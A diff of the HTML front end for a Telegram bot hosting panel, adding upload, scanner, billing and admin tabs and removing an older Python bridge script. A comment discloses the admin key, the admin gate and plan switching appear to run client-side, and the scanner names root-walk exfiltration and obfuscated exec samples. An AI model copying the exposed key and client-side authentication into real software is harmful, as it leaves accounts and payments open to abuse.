+            <input id="uploadBotToken" type="password" placeholder="e.g., 7123456789:AAHxyz..." class="w-full px-3.5 py-2.5 rounded-xl bg-slate-950 border border-slate-800 text-sm text-white font-mono focus:outline-none focus:border-indigo-500" />
+            <p class="text-[11px] text-slate-400 mt-1">
+              <i class="fa-solid fa-info-circle text-indigo-400 mr-1"></i>
+              Passing your token as an environment variable avoids hardcoding credentials in source files.
+            </p>
+          </div>
+
+          <!-- Paste Code Or Sample Selector -->
+          <div>
+            <div class="flex items-center justify-between mb-1.5">
+              <label class="text-xs font-semibold text-slate-300">Bot Source Code (Preview / Direct Editor)</label>
+              <div class="flex gap-1.5">
+                <button type="button" onclick="loadUploadSample('safe')" class="text-[11px] px-2 py-0.5 rounded bg-emerald-500/15 text-emerald-300 border border-emerald-500/30">Load Safe Bot</button>
+                <button type="button" onclick="loadUploadSample('malicious')" class="text-[11px] px-2 py-0.5 rounded bg-rose-500/15 text-rose-300 border border-rose-500/30">Test Malicious Bot</button>
+              </div>
+            </div>
+            <textarea id="uploadCodeArea" rows="6" class="w-full p-3 rounded-xl bg-slate-950 border border-slate-800 text-xs text-slate-200 font-mono focus:outline-none focus:border-indigo-500" placeholder="# Paste Python or JS bot code here or select a file above..."></textarea>
+          </div>
+
+          <!-- Deploy Progress Bar (Hidden until deploy clicked) -->
+          <div id="deployProgressBox" class="hidden p-4 rounded-xl bg-slate-950 border border-indigo-500/30 space-y-2">
+            <div class="flex items-center justify-between text-xs">
+              <span id="deployStageText" class="font-semibold text-indigo-300">Scanning &amp; Encrypting...</span>
+              <span id="deployPercentText" class="font-mono text-white">0%</span>
+            </div>
+            <div class="w-full h-2 bg-slate-800 rounded-full overflow-hidden">
+              <div id="deployProgressBar" class="h-full bg-gradient-to-r from-indigo-500 to-emerald-400 transition-all duration-300" style="width: 0%"></div>
+            </div>
+          </div>
+
+          <div class="flex justify-end gap-3 pt-2">
+            <button onclick="scanAndDeployBot()" class="px-6 py-3 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white font-semibold text-sm flex items-center gap-2 shadow-lg glow-indigo transition">
+              <i class="fa-solid fa-shield-check"></i> Scan, Encrypt &amp; Deploy Bot
+            </button>
+          </div>
+        </div>
+
+        <!-- Right 1 Col: Security & Sandbox Architecture Info -->
+        <div class="rounded-2xl bg-slate-900/90 border border-slate-800 p-6 space-y-5">
+          <h3 class="font-bold text-base text-white flex items-center gap-2">
+            <i class="fa-solid fa-lock text-emerald-400"></i>
+            Deployment Pipeline
+          </h3>
+          <ol class="space-y-4 text-xs text-slate-300">
+            <li class="flex gap-3">
+              <span class="w-6 h-6 rounded-full bg-indigo-500/20 border border-indigo-500/40 text-indigo-300 font-bold flex items-center justify-center shrink-0">1</span>
+              <div>
+                <p class="font-semibold text-white">Static + AST + AI Security Scan</p>
+                <p class="text-slate-400 mt-0.5">Blocks root directory walks (<code>os.walk('/root')</code>), zip-slip attacks, and obfuscated backdoors before saving.</p>
+              </div>
+            </li>
+            <li class="flex gap-3">
+              <span class="w-6 h-6 rounded-full bg-indigo-500/20 border border-indigo-500/40 text-indigo-300 font-bold flex items-center justify-center shrink-0">2</span>
+              <div>
+                <p class="font-semibold text-white">Fernet AES-128 Per-File Encryption</p>
+                <p class="text-slate-400 mt-0.5">Plaintext is encrypted into <code>storage/encfiles/*.enc</code>. Decryption keys are stored in our private GitHub Keyring.</p>
+              </div>
+            </li>
+            <li class="flex gap-3">
+              <span class="w-6 h-6 rounded-full bg-indigo-500/20 border border-indigo-500/40 text-indigo-300 font-bold flex items-center justify-center shrink-0">3</span>
+              <div>
+                <p class="font-semibold text-white">AST Auto-Dependency Installer</p>
+                <p class="text-slate-400 mt-0.5">Scans all <code>import</code> statements and installs third-party PyPI packages into an isolated <code>.deps</code> folder.</p>
+              </div>
+            </li>
+            <li class="flex gap-3">
+              <span class="w-6 h-6 rounded-full bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 font-bold flex items-center justify-center shrink-0">4</span>
+              <div>
+                <p class="font-semibold text-white">Runtime Source Wipe Sandbox</p>
+                <p class="text-slate-400 mt-0.5">6 seconds after launch, source files on disk are overwritten with <code># sandboxed</code> while bytecode runs safely in RAM.</p>
+              </div>
+            </li>
+          </ol>
+        </div>
+      </div>
+    </section>
+
+    <!-- ===================================================================== -->
+    <!-- TAB 3: MY BOTS MANAGER                                                -->
+    <!-- ===================================================================== -->
+    <section id="tab-bots" class="tab-section hidden space-y-6">
+      <div class="flex flex-wrap items-center justify-between gap-4">
+        <div>
+          <h2 class="text-xl font-bold text-white flex items-center gap-2">
+            <i class="fa-solid fa-server text-indigo-400"></i>
+            My Hosted Bots
+          </h2>
+          <p class="text-xs text-slate-400">Control child processes, inspect live stdout/stderr logs, edit environment variables, and open Cloudflare tunnels</p>
+        </div>
+        <button onclick="switchTab('upload')" class="px-4 py-2.5 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-semibold flex items-center gap-2 transition">
+          <i class="fa-solid fa-plus"></i> Upload New Bot
+        </button>
+      </div>
+
+      <!-- Bots Grid -->
+      <div id="myBotsContainer" class="grid grid-cols-1 md:grid-cols-2 gap-5">
+        <!-- Populated dynamically by JS -->
+      </div>
+    </section>
+
+    <!-- ===================================================================== -->
+    <!-- TAB 4: AI + AST + STATIC SECURITY SCANNER                             -->
+    <!-- ===================================================================== -->
+    <section id="tab-scanner" class="tab-section hidden space-y-6">
+      <div class="rounded-2xl bg-slate-900/90 border border-slate-800 p-6 space-y-5">
+        <div class="flex flex-wrap items-center justify-between gap-4">
+          <div>
+            <h2 class="text-xl font-bold text-white flex items-center gap-2">
+              <i class="fa-solid fa-shield-virus text-indigo-400"></i>
+              3-Layer Bot Security Scanner
+            </h2>
+            <p class="text-xs text-slate-400">
+              Powered by Static Regex Patterns + Python AST Tree Analysis + OpenRouter <code>google/gemma-4-31b-it:free</code> AI Model
+            </p>
+          </div>
+          <div class="flex flex-wrap gap-2">
+            <button onclick="loadScannerPreset('clean')" class="px-3 py-1.5 rounded-xl bg-emerald-500/15 hover:bg-emerald-500/25 text-emerald-300 border border-emerald-500/30 text-xs font-medium transition">
+              <i class="fa-solid fa-check mr-1"></i> Safe Telebot Sample
+            </button>
+            <button onclick="loadScannerPreset('theft')" class="px-3 py-1.5 rounded-xl bg-amber-500/15 hover:bg-amber-500/25 text-amber-300 border border-amber-500/30 text-xs font-medium transition">
+              <i class="fa-solid fa-folder-open mr-1"></i> Root Walk / Exfil Sample
+            </button>
+            <button onclick="loadScannerPreset('obfuscated')" class="px-3 py-1.5 rounded-xl bg-rose-500/15 hover:bg-rose-500/25 text-rose-300 border border-rose-500/30 text-xs font-medium transition">
+              <i class="fa-solid fa-biohazard mr-1"></i> Obfuscated Zlib+XOR Exec Sample
+            </button>
+          </div>
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+          <!-- Code Input -->
+          <div class="space-y-3">
+            <textarea id="scannerCodeInput" rows="13" class="w-full p-4 rounded-xl bg-slate-950 border border-slate-800 text-xs text-slate-200 font-mono focus:outline-none focus:border-indigo-500" placeholder="# Paste Python or JS code here to test the security scanner..."></textarea>
+            <button onclick="executeStandaloneScan()" class="w-full py-3 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white font-semibold text-sm flex items-center justify-center gap-2 shadow-lg glow-indigo transition">
+              <i class="fa-solid fa-magnifying-glass-chart"></i> Run Combined Security Scan
+            </button>
+          </div>
+
+          <!-- Scan Verdict Output -->
+          <div id="scannerResultPanel" class="rounded-xl bg-slate-950 border border-slate-800 p-5 flex flex-col justify-between space-y-4">
+            <div class="space-y-4">
+              <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+                <div>
+                  <span class="text-xs text-slate-400 uppercase tracking-wider">Final Verdict</span>
+                  <h3 id="scanVerdictBadge" class="text-xl font-extrabold text-emerald-400 mt-0.5">SAFE • APPROVE</h3>
                 </div>
-            </div>
-
-            <div class="btn-group">
-                <button class="btn btn-start" id="startBtn" onclick="startUniversalBot()">🚀 Host &amp; Start Bot</button>
-                <button class="btn btn-stop" id="stopBtn" onclick="stopUniversalBot()">🛑 Stop Bot</button>
-            </div>
-
-            <div class="btn-group">
-                <button class="btn btn-small" style="flex:1;" onclick="resetUptimeStats()">🔄 Reset Uptime</button>
-                <button class="btn btn-small" style="flex:1; color:var(--red);" onclick="clearDeviceDB()">🗑️ Clear Device DB</button>
-            </div>
-        </div>
-
-        <!-- Right Code Editor & Live Console -->
-        <div class="card">
-            <div class="card-title">
-                <span>2. Bot Code Editor (Auto-Saves to Device DB)</span>
-                <div style="display:flex; gap:6px;">
-                    <button class="btn btn-small" onclick="saveAllToDeviceDB(true)">💾 Save Now</button>
-                    <button class="btn btn-small" onclick="loadDemoTemplate()">Load Demo Bot</button>
+                <div class="text-right">
+                  <span class="text-xs text-slate-400 uppercase tracking-wider">Merged Risk Score</span>
+                  <p id="scanRiskScore" class="text-2xl font-mono font-extrabold text-white">0 / 100</p>
                 </div>
+              </div>
+
+              <!-- Risk Meter -->
+              <div class="w-full h-2.5 bg-slate-800 rounded-full overflow-hidden">
+                <div id="scanRiskBar" class="h-full bg-emerald-500 transition-all duration-300" style="width: 2%"></div>
+              </div>
+
+              <!-- AI Summary -->
+              <div class="p-3.5 rounded-xl bg-slate-900 border border-slate-800 text-xs space-y-1">
+                <p class="font-semibold text-indigo-300 flex items-center gap-1.5">
+                  <i class="fa-solid fa-wand-magic-sparkles"></i> AI &amp; AST Summary
+                </p>
+                <p id="scanSummaryText" class="text-slate-300 leading-relaxed">
+                  Select a sample or paste code and click "Run Combined Security Scan" to inspect threats.
+                </p>
+              </div>
+
+              <!-- Threat List -->
+              <div>
+                <p class="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-2">Detected Findings</p>
+                <ul id="scanFindingsList" class="space-y-1.5 text-xs font-mono">
+                  <li class="text-emerald-400">✔ No malicious patterns or dynamic exec() calls found.</li>
+                </ul>
+              </div>
             </div>
 
-            <textarea class="code-box" id="codeEditor" spellcheck="false" oninput="saveAllToDeviceDB()"></textarea>
-
-            <div class="card-title">
-                <span>3. Live Hosting Terminal Logs</span>
-                <button class="btn btn-small" onclick="clearTerminal()">Clear Logs</button>
+            <div class="text-[11px] text-slate-500 border-t border-slate-900 pt-3 flex items-center justify-between">
+              <span>Weights: Data Theft (40) • Backdoor (40) • Credentials (10)</span>
+              <span>AI Weight: 60% | Pattern: 40%</span>
             </div>
-
-            <div class="console" id="terminalBox">[*] DarkX Universal Bot Hosting Panel Initialized.</div>
+          </div>
         </div>
+      </div>
+    </section>
+
+    <!-- ===================================================================== -->
+    <!-- TAB 5: PLANS & BILLING                                                -->
+    <!-- ===================================================================== -->
+    <section id="tab-plans" class="tab-section hidden space-y-6">
+      <div class="rounded-2xl bg-gradient-to-r from-indigo-950/70 via-slate-900 to-amber-950/40 border border-indigo-500/30 p-5 flex flex-wrap items-center justify-between gap-4">
+        <div class="space-y-1">
+          <div class="inline-flex items-center gap-2 text-xs font-bold text-amber-300 uppercase tracking-wider">
+            <i class="fa-solid fa-bolt"></i> Instant Plan Switcher Mode
+          </div>
+          <h2 class="text-xl sm:text-2xl font-extrabold text-white">Select Any Plan to Activate Immediately</h2>
+          <p class="text-xs text-slate-300">
+            Click <strong>"Select &amp; Activate"</strong> on any plan below (or use the top bar selector) to immediately switch your active plan, bot slots, and RAM allocation.
+          </p>
+        </div>
+        <div class="px-4 py-2.5 rounded-xl bg-slate-950/90 border border-amber-500/40 text-xs flex items-center gap-2.5">
+          <span class="text-slate-400">Currently Selected:</span>
+          <span id="plansPageCurrentBadge" class="font-mono font-extrabold text-amber-300 text-sm uppercase">PRO PLAN (8 Slots)</span>
+        </div>
+      </div>
+
+      <!-- 6 Pricing Cards Grid -->
+      <div id="plansGridContainer" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">
+        <!-- Populated dynamically from PLAN_LIMITS -->
+      </div>
+    </section>
+
+    <!-- ===================================================================== -->
+    <!-- TAB 6: ADMIN PANEL (PROTECTED BY KEY: Ashif123)                       -->
+    <!-- ===================================================================== -->
+    <section id="tab-admin" class="tab-section hidden space-y-6">
+
+      <!-- LOCKED VIEW: ADMIN KEY AUTHENTICATION GATE -->
+      <div id="adminLockScreen" class="max-w-md mx-auto my-8 rounded-2xl bg-slate-900/95 border border-rose-500/30 p-6 sm:p-8 shadow-2xl space-y-6 text-center">
+        <div class="w-16 h-16 rounded-2xl bg-rose-500/15 border border-rose-500/30 flex items-center justify-center mx-auto text-rose-400 text-2xl shadow-lg">
+          <i class="fa-solid fa-shield-halved"></i>
+        </div>
+        <div class="space-y-1.5">
+          <span class="px-2.5 py-0.5 rounded-full bg-rose-500/15 text-rose-300 border border-rose-500/30 text-[11px] font-mono font-semibold uppercase">
+            Restricted Owner Area
+          </span>
+          <h2 class="text-xl font-extrabold text-white">Admin Panel Authentication</h2>
+          <p class="text-xs text-slate-400">
+            Enter your secret Admin Security Key to unlock full system controls, bot approvals, and GitHub backup settings.
+          </p>
+        </div>
+
+        <div id="adminLockFormBox" class="space-y-3 text-left">
+          <label class="block text-xs font-semibold text-slate-300">Admin Security Key</label>
+          <div class="relative">
+            <input
+              id="adminKeyInput"
+              type="password"
+              placeholder="Enter Admin Key..."
+              onkeydown="if(event.key === 'Enter') verifyAdminKey()"
+              class="w-full pl-10 pr-10 py-3 rounded-xl bg-slate-950 border border-slate-700 focus:border-rose-500 text-sm text-white font-mono focus:outline-none transition"
+            />
+            <i class="fa-solid fa-key absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-500 text-xs"></i>
+            <button
+              type="button"
+              onclick="toggleAdminKeyVisibility()"
+              class="absolute right-3.5 top-1/2 -translate-y-1/2 text-slate-400 hover:text-white text-xs"
+              title="Show/Hide Key"
+            >
+              <i id="adminKeyEyeIcon" class="fa-regular fa-eye"></i>
+            </button>
+          </div>
+          <p id="adminKeyErrorMsg" class="hidden text-xs text-rose-400 font-medium flex items-center gap-1.5 pt-0.5">
+            <i class="fa-solid fa-circle-exclamation"></i>
+            <span>Invalid Admin Key! Access Denied.</span>
+          </p>
+        </div>
+
+        <button
+          onclick="verifyAdminKey()"
+          class="w-full py-3 rounded-xl bg-gradient-to-r from-rose-600 to-indigo-600 hover:from-rose-500 hover:to-indigo-500 text-white font-bold text-sm flex items-center justify-center gap-2 shadow-lg transition"
+        >
+          <i class="fa-solid fa-unlock-keyhole"></i>
+          <span>Login to Admin Panel</span>
+        </button>
+      </div>
+
+      <!-- UNLOCKED VIEW: FULL ADMIN CONTROL CENTER -->
+      <div id="adminUnlockedContent" class="hidden space-y-6">
+        <div class="rounded-2xl bg-gradient-to-r from-rose-950/60 via-slate-900 to-slate-900 border border-rose-500/30 p-5 flex flex-wrap items-center justify-between gap-4">
+          <div class="flex items-center gap-3">
+            <div class="w-11 h-11 rounded-xl bg-emerald-500/15 border border-emerald-500/30 flex items-center justify-center text-emerald-400 text-lg">
+              <i class="fa-solid fa-user-check"></i>
+            </div>
+            <div>
+              <div class="flex items-center gap-2">
+                <h2 class="text-lg font-bold text-white">Owner &amp; Admin Control Center</h2>
+                <span class="px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 text-[10px] font-mono font-bold">AUTHENTICATED</span>
+              </div>
+              <p class="text-xs text-slate-400">Owner ID: <code class="text-rose-300">8253072984</code> • Role: <strong>Owner (Full Access)</strong></p>
+            </div>
+          </div>
+          <div class="flex flex-wrap gap-2">
+            <button onclick="toggleApprovalGate()" id="adminApprovalBtn" class="px-3.5 py-2 rounded-xl bg-emerald-500/15 border border-emerald-500/30 text-emerald-300 text-xs font-semibold transition">
+              <i class="fa-solid fa-check-double mr-1"></i> Approval Mode: ON
+            </button>
+            <button onclick="toggleMaintenanceMode()" id="adminMaintBtn" class="px-3.5 py-2 rounded-xl bg-slate-800 border border-slate-700 text-slate-300 text-xs font-semibold transition">
+              <i class="fa-solid fa-screwdriver-wrench mr-1"></i> Maintenance: OFF
+            </button>
+            <button onclick="triggerGitHubBackup()" class="px-3.5 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-semibold transition">
+              <i class="fa-brands fa-github mr-1"></i> Backup to GitHub Now
+            </button>
+            <button onclick="lockAdminPanel()" class="px-3.5 py-2 rounded-xl bg-rose-600/20 hover:bg-rose-600/30 border border-rose-500/40 text-rose-300 text-xs font-semibold transition">
+              <i class="fa-solid fa-lock mr-1"></i> Lock Admin
+            </button>
+          </div>
+        </div>
+
+        <!-- Admin Quick Tools Row: Give Plan, Create Coupon, Broadcast -->
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+          <!-- Give / Switch Plan Tool -->
+          <div class="rounded-2xl bg-slate-900/90 border border-slate-800 p-4 space-y-3">
+            <h3 class="text-xs font-bold text-amber-300 uppercase tracking-wider flex items-center gap-1.5">
+              <i class="fa-solid fa-crown"></i> Instant Plan Override
+            </h3>
+            <p class="text-[11px] text-slate-400">Switch your active plan or grant any tier immediately:</p>
+            <div class="flex gap-2">
+              <select id="adminGivePlanSelect" class="flex-1 px-3 py-2 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white font-semibold">
+                <option value="free">Free (2 Bots / 128MB)</option>
+                <option value="starter">Starter (4 Bots / 256MB)</option>
+                <option value="basic">Basic (6 Bots / 512MB)</option>
+                <option value="pro" selected>Pro (8 Bots / 2048MB)</option>
+                <option value="enterprise">Enterprise (10 Bots / 4096MB)</option>
+                <option value="lifetime">Lifetime (15 Bots / 8192MB)</option>
+              </select>
+              <button onclick="selectPlanDirect(document.getElementById('adminGivePlanSelect').value)" class="px-3.5 py-2 rounded-xl bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold text-xs shrink-0 transition">
+                Apply Plan
+              </button>
+            </div>
+          </div>
+
+          <!-- Create Coupon Tool -->
+          <div class="rounded-2xl bg-slate-900/90 border border-slate-800 p-4 space-y-3">
+            <h3 class="text-xs font-bold text-emerald-300 uppercase tracking-wider flex items-center gap-1.5">
+              <i class="fa-solid fa-ticket"></i> Create Wallet Coupon
+            </h3>
+            <div class="grid grid-cols-2 gap-2">
+              <input id="adminCouponCode" type="text" placeholder="CODE (e.g. VIP200)" class="px-3 py-2 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white font-mono" />
+              <input id="adminCouponAmt" type="number" placeholder="Credit ৳ (200)" value="200" class="px-3 py-2 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white font-mono" />
+            </div>
+            <button onclick="createAdminCoupon()" class="w-full py-2 rounded-xl bg-emerald-600/20 hover:bg-emerald-600/30 border border-emerald-500/30 text-emerald-300 font-semibold text-xs transition">
+              <i class="fa-solid fa-plus mr-1"></i> Generate &amp; Save Coupon
+            </button>
+          </div>
+
+          <!-- Global Broadcast Tool -->
+          <div class="rounded-2xl bg-slate-900/90 border border-slate-800 p-4 space-y-3">
+            <h3 class="text-xs font-bold text-indigo-300 uppercase tracking-wider flex items-center gap-1.5">
+              <i class="fa-solid fa-bullhorn"></i> Global Announcement
+            </h3>
+            <input id="adminBroadcastInput" type="text" placeholder="Message to all panel users..." class="w-full px-3 py-2 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white" />
+            <button onclick="sendAdminBroadcast()" class="w-full py-2 rounded-xl bg-indigo-600/20 hover:bg-indigo-600/30 border border-indigo-500/30 text-indigo-300 font-semibold text-xs transition">
+              <i class="fa-solid fa-paper-plane mr-1"></i> Broadcast to All Users
+            </button>
+          </div>
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+          <!-- Pending Bot Approvals Queue -->
+          <div class="lg:col-span-2 rounded-2xl bg-slate-900/90 border border-slate-800 p-5 space-y-4">
+            <div class="flex items-center justify-between">
+              <h3 class="font-bold text-base text-white flex items-center gap-2">
+                <i class="fa-solid fa-hourglass-half text-amber-400"></i>
+                Pending Bot Upload Approvals
+              </h3>
+              <span id="pendingCountLabel" class="text-xs font-mono text-slate-400">2 waiting</span>
+            </div>
+            <div id="adminPendingContainer" class="space-y-3">
+              <!-- Populated by JS -->
+            </div>
+          </div>
+
+          <!-- GitHub Backup & System Mass Controls -->
+          <div class="rounded-2xl bg-slate-900/90 border border-slate-800 p-5 space-y-5">
+            <div>
+              <h3 class="font-bold text-base text-white flex items-center gap-2">
+                <i class="fa-brands fa-github text-white"></i>
+                GitHub Backup &amp; Keyring
+              </h3>
+              <div class="mt-3 space-y-2 text-xs">
+                <div class="flex justify-between py-1.5 border-b border-slate-800">
+                  <span class="text-slate-400">Backup Repo:</span>
+                  <code class="text-indigo-300">simran-ops/panel-vault</code>
+                </div>
+                <div class="flex justify-between py-1.5 border-b border-slate-800">
+                  <span class="text-slate-400">Branch / Interval:</span>
+                  <span class="text-white font-mono">main (360m)</span>
+                </div>
+                <div class="flex justify-between py-1.5 border-b border-slate-800">
+                  <span class="text-slate-400">Last Snapshot:</span>
+                  <span id="ghLastBackupTime" class="text-emerald-400 font-mono">Just now</span>
+                </div>
+              </div>
+            </div>
+
+            <div class="space-y-2 pt-2 border-t border-slate-800">
+              <p class="text-xs font-semibold text-slate-400 uppercase tracking-wider">Mass Subprocess Operations</p>
+              <div class="grid grid-cols-2 gap-2">
+                <button onclick="adminMassAction('restart')" class="p-2.5 rounded-xl bg-emerald-500/15 hover:bg-emerald-500/25 border border-emerald-500/30 text-emerald-300 text-xs font-semibold transition">
+                  <i class="fa-solid fa-rotate mr-1"></i> Restart All
+                </button>
+                <button onclick="adminMassAction('stop')" class="p-2.5 rounded-xl bg-rose-500/15 hover:bg-rose-500/25 border border-rose-500/30 text-rose-300 text-xs font-semibold transition">
+                  <i class="fa-solid fa-stop mr-1"></i> Stop All
+                </button>
+              </div>
+            </div>
+
+            <!-- Audit Log Stream -->
+            <div class="space-y-2 pt-2 border-t border-slate-800">
+              <p class="text-xs font-semibold text-slate-400 uppercase tracking-wider">Recent Audit Log</p>
+              <div id="adminAuditList" class="space-y-1.5 max-h-40 overflow-y-auto text-[11px] font-mono text-slate-300">
+                <!-- Populated by JS -->
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- ===================== MODALS (LOGS, ENV, PIP, TUNNEL, PAYMENT) ===================== -->
+  <div id="modalBackdrop" class="fixed inset-0 z-50 bg-black/75 backdrop-blur-sm hidden items-center justify-center p-4">
+    <div id="modalContent" class="bg-slate-900 border border-slate-700 rounded-2xl max-w-2xl w-full p-6 shadow-2xl space-y-4 max-h-[90vh] overflow-y-auto">
+      <!-- Populated dynamically -->
     </div>
+  </div>
 
-<!-- =========================================================
-     PURE PYTHON BRIDGE SCRIPT (NO JS STRING ESCAPING ISSUES)
-     ========================================================= -->
-<script type="text/python" id="pyBridgeSource">
-import sys
-import os
-import types
-import json
-import base64
-import re
-import time
-import io
-import traceback
-import js
+  <!-- ===================== TOAST NOTIFICATION CONTAINER ===================== -->
+  <div id="toastContainer" class="fixed bottom-5 right-5 z-50 flex flex-col gap-2 max-w-sm w-full pointer-events-none"></div>
 
-_handlers = []
-_callback_handlers = []
-_next_step_handlers = {}
-_default_parse_mode = None
+  <!-- ===================== FOOTER ===================== -->
+  <footer class="border-t border-slate-900 bg-slate-950/90 py-4 px-4 mt-12 text-xs text-slate-500">
+    <div class="max-w-7xl mx-auto flex flex-wrap items-center justify-between gap-2">
+      <span><strong>ѕιмяαη нoѕтιηg ＲΒOT v2.1</strong> • Fernet AES-128 Sandbox Engine</span>
+      <span>Support: <a href="https://t.me/nur7871" target="_blank" class="text-indigo-400 hover:underline">@nur7871</a></span>
+    </div>
+  </footer>
 
-# Pre-populated in-memory file cache (populated by JS before handler runs)
-_py_file_info_cache = {}
-_py_file_bytes_cache = {}
+  <!-- ===================== APPLICATION JAVASCRIPT ===================== -->
+  <script>
+    // ─── 1. CORE DATA & STATE FROM bot.py ──────────────────────────────────
+    const PLAN_LIMITS = {
+      free:       { name: "Free",       max_bots: 2,  ram: 128,  auto_restart: false, price: 0,    days: 0 },
+      starter:    { name: "Starter",    max_bots: 4,  ram: 256,  auto_restart: true,  price: 99,   days: 30 },
+      basic:      { name: "Basic",      max_bots: 6,  ram: 512,  auto_restart: true,  price: 199,  days: 30 },
+      pro:        { name: "Pro",        max_bots: 8,  ram: 2048, auto_restart: true,  price: 499,  days: 30 },
+      enterprise: { name: "Enterprise", max_bots: 10, ram: 4096, auto_restart: true,  price: 999,  days: 30 },
+      lifetime:   { name: "Lifetime",   max_bots: 15, ram: 8192, auto_restart: true,  price: 1999, days: 36500 },
+    };
 
-def _register_pre_downloaded_file(file_id, file_path, file_size, b64_data):
-    _py_file_info_cache[str(file_id)] = {
-        "file_id": str(file_id),
-        "file_unique_id": str(file_id),
-        "file_size": int(file_size or 0),
-        "file_path": str(file_path)
-    }
-    if b64_data:
-        raw = base64.b64decode(str(b64_data))
-        _py_file_bytes_cache[str(file_path)] = raw
-        _py_file_bytes_cache[str(file_id)] = raw
+    const PAYMENT_METHODS = {
+      bkash:   { name: "bKash",       number: "01306633616",          type: "Send Money",        tag: "[B]",  color: "text-pink-400" },
+      nagad:   { name: "Nagad",       number: "01306633616",          type: "Send Money",        tag: "[N]",  color: "text-orange-400" },
+      rocket:  { name: "Rocket",      number: "01306633616",          type: "Send Money",        tag: "[R]",  color: "text-purple-400" },
+      upay:    { name: "Upay",        number: "01306633616",          type: "Send Money",        tag: "[U]",  color: "text-yellow-400" },
+      binance: { name: "Binance Pay", number: "Binance ID 758637628", type: "USDT (BEP20/TRC20)",tag: "[BP]", color: "text-amber-400" },
+    };
 
-def _to_clean_dict(obj):
-    if obj is None:
-        return None
-    if isinstance(obj, dict):
-        return obj
-    if hasattr(obj, "to_dict"):
-        return obj.to_dict()
-    if hasattr(obj, "to_json"):
-        try:
-            return json.loads(obj.to_json())
-        except Exception:
-            pass
-    return None
-
-class DictObj:
-    def __init__(self, d=None):
-        d = d or {}
-        self.__dict__["_raw"] = d
-        for k, v in d.items():
-            if isinstance(v, dict):
-                setattr(self, k, DictObj(v))
-            elif isinstance(v, list):
-                setattr(self, k, [DictObj(x) if isinstance(x, dict) else x for x in v])
-            else:
-                setattr(self, k, v)
-    def __getattr__(self, name):
-        return None
-    def get(self, k, default=None):
-        return self.__dict__["_raw"].get(k, default)
-    def __getitem__(self, k):
-        return self.__dict__["_raw"].get(k)
-    def __contains__(self, k):
-        return k in self.__dict__["_raw"]
-
-class FileObj:
-    def __init__(self, d=None):
-        d = d or {}
-        self.file_id = d.get("file_id", "")
-        self.file_unique_id = d.get("file_unique_id", "")
-        self.file_size = d.get("file_size", 0)
-        self.file_path = d.get("file_path", "")
-
-class DocumentObj:
-    def __init__(self, d=None):
-        d = d or {}
-        self.file_id = d.get("file_id", "")
-        self.file_unique_id = d.get("file_unique_id", "")
-        self.file_name = d.get("file_name", "document.txt")
-        self.mime_type = d.get("file_mime_type") or d.get("mime_type", "text/plain")
-        self.file_size = d.get("file_size", 0)
-        self.thumb = DictObj(d.get("thumb", {})) if "thumb" in d else None
-
-class ChatObj:
-    def __init__(self, d=None):
-        d = d or {}
-        self.id = d.get("id", 0)
-        self.type = d.get("type", "private")
-        self.title = d.get("title", "")
-        self.username = d.get("username", None)
-        self.first_name = d.get("first_name", "")
-        self.last_name = d.get("last_name", "")
-
-class UserObj:
-    def __init__(self, d=None):
-        d = d or {}
-        self.id = d.get("id", 0)
-        self.is_bot = d.get("is_bot", False)
-        self.first_name = d.get("first_name", "User")
-        self.last_name = d.get("last_name", None)
-        self.username = d.get("username", None)
-        self.language_code = d.get("language_code", "en")
-
-class MessageObj:
-    def __init__(self, d=None, bot_ref=None):
-        d = d or {}
-        self.json = d
-        self.message_id = d.get("message_id", 0)
-        self.id = self.message_id
-        self.date = d.get("date", int(time.time()))
-        self.chat = ChatObj(d.get("chat", {}))
-        self.from_user = UserObj(d.get("from", {}))
-        self.sender_chat = ChatObj(d["sender_chat"]) if "sender_chat" in d else None
-        self.text = d.get("text", None)
-        self.caption = d.get("caption", None)
-        self.reply_to_message = MessageObj(d["reply_to_message"], bot_ref) if "reply_to_message" in d else None
-        self.document = DocumentObj(d["document"]) if "document" in d else None
-        self.photo = [DictObj(x) for x in d["photo"]] if "photo" in d else None
-        self.video = DictObj(d["video"]) if "video" in d else None
-        self.audio = DictObj(d["audio"]) if "audio" in d else None
-        self.voice = DictObj(d["voice"]) if "voice" in d else None
-        self.sticker = DictObj(d["sticker"]) if "sticker" in d else None
-        self.contact = DictObj(d["contact"]) if "contact" in d else None
-        self.location = DictObj(d["location"]) if "location" in d else None
-        self._bot = bot_ref
-
-        if self.text is not None:
-            self.content_type = "text"
-        elif self.document is not None:
-            self.content_type = "document"
-        elif self.photo is not None:
-            self.content_type = "photo"
-        elif self.video is not None:
-            self.content_type = "video"
-        elif self.audio is not None:
-            self.content_type = "audio"
-        elif self.voice is not None:
-            self.content_type = "voice"
-        elif self.sticker is not None:
-            self.content_type = "sticker"
-        else:
-            self.content_type = "text"
-
-    async def reply_text(self, text, **kwargs):
-        b = self._bot or _global_bot
-        return b.reply_to(self, text, **kwargs)
-
-    async def edit_text(self, text, **kwargs):
-        b = self._bot or _global_bot
-        return b.edit_message_text(text, self.chat.id, self.message_id, **kwargs)
-
-    async def delete(self):
-        b = self._bot or _global_bot
-        return b.delete_message(self.chat.id, self.message_id)
-
-    async def reply_document(self, document, caption=None, **kwargs):
-        b = self._bot or _global_bot
-        return b.send_document(self.chat.id, document, caption=caption, reply_to_message_id=self.message_id, **kwargs)
-
-class CallbackQueryObj:
-    def __init__(self, d=None, bot_ref=None):
-        d = d or {}
-        self.id = d.get("id", "0")
-        self.from_user = UserObj(d.get("from", {}))
